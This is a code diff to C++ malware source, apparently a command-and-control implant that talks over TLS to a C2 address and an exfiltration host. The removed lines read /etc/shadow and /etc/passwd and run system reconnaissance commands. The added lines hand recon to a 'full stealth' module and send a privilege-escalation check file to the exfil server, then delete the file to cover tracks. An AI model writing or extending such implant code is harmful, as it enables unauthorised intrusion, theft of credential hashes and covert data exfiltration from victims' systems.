@@ -10,6 +10,7 @@
 #include <memory>
 #include <array>
 #include <fstream>
+#include <cstring>      // for std::remove
 
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -17,6 +18,9 @@
 #include <unistd.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+
+// Full stealth reconnaissance module
+#include "recon.h"
 
 #ifndef C2_IP
 #define C2_IP "10.37.1.249"
@@ -45,6 +49,7 @@ std::vector<std::byte> encrypt(std::string s) {
     return e;
 }
 
+// Used for CMD execution only (recon uses its own internal exec)
 std::string exec(const char* cmd) {
     std::array<char, 128> buffer;
     std::string r;
@@ -57,44 +62,10 @@ std::string exec(const char* cmd) {
 }
 
 // ----------------------------------------------------------------------
-// Simple file reader
-// ----------------------------------------------------------------------
-static std::string read_file(const std::string& path) {
-    std::ifstream f(path);
-    if (!f.is_open()) {
-        return "[!] Could not read " + path + "\n";
-    }
-    std::ostringstream ss;
-    ss << f.rdbuf();
-    return ss.str();
-}
-
-// ----------------------------------------------------------------------
-// Reconnaissance collection
+// Reconnaissance collection – now delegates to the full stealth module
 // ----------------------------------------------------------------------
 static std::string run_recon() {
-    std::ostringstream out;
-    out << "=== MINIMAL RECON REPORT ===\n\n";
-    
-    out << "[*] System Info:\n";
-    out << exec("uname -a");
-    out << exec("id");
-    out << exec("hostname");
-    
-    out << "\n[*] /etc/passwd:\n";
-    out << read_file("/etc/passwd");
-    
-    out << "\n[*] /etc/shadow:\n";
-    out << read_file("/etc/shadow");
-    
-    out << "\n[*] /etc/group:\n";
-    out << read_file("/etc/group");
-    
-    out << "\n[*] /tmp directory:\n";
-    out << exec("ls -la /tmp 2>/dev/null");
-    
-    out << "\n=== END RECON ===\n";
-    return out.str();
+    return perform_full_recon();
 }
 
 // ----------------------------------------------------------------------
@@ -188,6 +159,21 @@ int main() {
     if (sock2 < 0) { SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
     SSL* ssl2 = connectTLS(ctx, sock2, EXFIL_IP);
     if (!ssl2) { close(sock2); SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
+
+    // ------------------------------------------------------------------
+    // Exfiltrate privesc check results if beachhead left a file
+    // ------------------------------------------------------------------
+    {
+        std::ifstream f("/tmp/privesc_check.txt");
+        if (f.is_open()) {
+            std::stringstream ss;
+            ss << f.rdbuf();
+            exfiltrate(ssl2, "[PRIVESC CHECK]\n" + ss.str() + "\n");
+            f.close();
+            // Clean up so it's only sent once
+            std::remove("/tmp/privesc_check.txt");
+        }
+    }
 
     char buf[1024];
     while (true) {
